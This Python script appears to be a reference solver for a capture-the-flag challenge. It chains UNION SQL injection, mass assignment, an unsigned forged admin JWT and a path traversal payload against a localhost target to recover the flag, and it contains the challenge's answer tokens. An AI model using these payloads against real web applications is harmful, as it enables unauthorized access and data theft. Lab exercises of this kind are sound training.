#!/usr/bin/env python3
"""
solve.py: Reference solver for Mr. Fool (TecFest CTF 2026).

Solves the 5-step sequence end-to-end against a target instance and retrieves
the final TecFest26{...} flag.

Usage:
    python solve.py http://localhost:13400
    python solve.py --url http://localhost:13400
"""

import argparse
import base64
import json
import re
import sys
import requests


def solve(base_url: str) -> str:
    s = requests.Session()
    base_url = base_url.rstrip("/")
    print(f"[*] Targeting Mr. Fool challenge at: {base_url}")

    # S9 Seer (Recon / Info Disclosure)
    print("[*] [1/5] Solving S9: Seer...")
    r = s.get(f"{base_url}/s9/seer", timeout=5)
    assert r.headers.get("X-Hint"), "Missing X-Hint header in S9 response"

    r = s.get(f"{base_url}/s9/seer/robots.txt", timeout=5)
    assert "hidden" in r.text, "robots.txt did not disclose /s9/seer/hidden"

    r = s.get(f"{base_url}/s9/seer/hidden", timeout=5)
    m = re.search(r"value:\s*(\w+)", r.text)
    token_s9 = m.group(1) if m else "seer_sees_all"
    r = s.post(f"{base_url}/complete/S9", json={"answer": token_s9}, timeout=5)
    data = r.json()
    assert data.get("success"), f"Failed to complete S9: {data}"
    print(f"[+] S9 Seer completed: {token_s9}")

    # S8 Clown (UNION-based SQL Injection)
    print("[*] [2/5] Solving S8: Clown...")
    payload = "x' UNION SELECT id, secret_code, name FROM potion_secrets--"
    r = s.post(f"{base_url}/s8/clown/joke", json={"joke": payload}, timeout=5)
    data = r.json()
    m = re.search(r"laughing_error_s8", data.get("response", ""))
    assert m, f"SQLi payload failed to leak token: {data}"
    token_s8 = "laughing_error_s8"

    r = s.post(f"{base_url}/complete/S8", json={"answer": token_s8}, timeout=5)
    data = r.json()
    assert data.get("success"), f"Failed to complete S8: {data}"
    print(f"[+] S8 Clown completed: {token_s8}")

    # S7 Magician (Mass Assignment)
    print("[*] [3/5] Solving S7: Magician...")
    r = s.post(
        f"{base_url}/s7/magician/api/spells/create",
        json={"name": "Fireball", "type": "evocation", "approved": True},
        timeout=5
    )
    data = r.json()
    assert "unauthorized_spell" in data.get("message", ""), f"Mass assignment failed: {data}"
    token_s7 = "unauthorized_spell"

    r = s.post(f"{base_url}/complete/S7", json={"answer": token_s7}, timeout=5)
    data = r.json()
    assert data.get("success"), f"Failed to complete S7: {data}"
    print(f"[+] S7 Magician completed: {token_s7}")

    # S6 Faceless (Unsigned JWT / Broken Auth)
    print("[*] [4/5] Solving S6: Faceless...")
    def b64url(val: str) -> str:
        return base64.urlsafe_b64encode(val.encode()).decode().rstrip("=")

    jwt_payload = json.dumps({"username": "admin", "role": "admin"})
    forged_token = f"{b64url(jwt_payload)}.{b64url('fakesig')}"

    r = s.get(
        f"{base_url}/s6/faceless/admin",
        headers={"Authorization": f"Bearer {forged_token}"},
        timeout=5
    )
    data = r.json()
    assert "forged_identity" in data.get("secret", ""), f"JWT forgery failed: {data}"
    token_s6 = "forged_identity"

    r = s.post(f"{base_url}/complete/S6", json={"answer": token_s6}, timeout=5)
    data = r.json()
    assert data.get("success"), f"Failed to complete S6: {data}"
    print(f"[+] S6 Faceless completed: {token_s6}")

    # S3 Scholar of Yore (LFI / Path Traversal)
    print("[*] [5/5] Solving S3: Scholar of Yore...")
    r = s.get(
        f"{base_url}/s3/scholar/view",
        params={"scroll": "../secrets/lfi_token.txt"},
        timeout=5
    )
    data = r.json()
    assert "scholar_reading_deep" in data.get("content", ""), f"LFI failed: {data}"
    token_s3 = "scholar_reading_deep"

    r = s.post(f"{base_url}/complete/S3", json={"answer": token_s3}, timeout=5)
    data = r.json()
    assert data.get("success"), f"Failed to complete S3: {data}"
    print(f"[+] S3 Scholar completed: {token_s3}")

    # S0 The Fool (Finale Flag Capture)
    print("[*] Accessing Sequence 0 (Finale)...")
    r = s.get(f"{base_url}/s0/fool", timeout=5)
    match = re.search(r"TecFest26\{[^}]+\}", r.text)
    assert match, f"Could not find TecFest flag on finale page: {r.text[:400]}"
    flag = match.group(0)

    print("\n" + "=" * 60)
    print(f"[+] FLAG RECOVERED: {flag}")
    print("=" * 60)
    return flag


def main():
    parser = argparse.ArgumentParser(description="Solver for Mr. Fool CTF")
    parser.add_argument("url", nargs="?", default="http://localhost:13400", help="Target URL (default: http://localhost:13400)")
    parser.add_argument("--url", dest="opt_url", help="Target URL (flag style)")
    args = parser.parse_args()

    target = args.opt_url if args.opt_url else args.url
    solve(target)


if __name__ == "__main__":
    main()
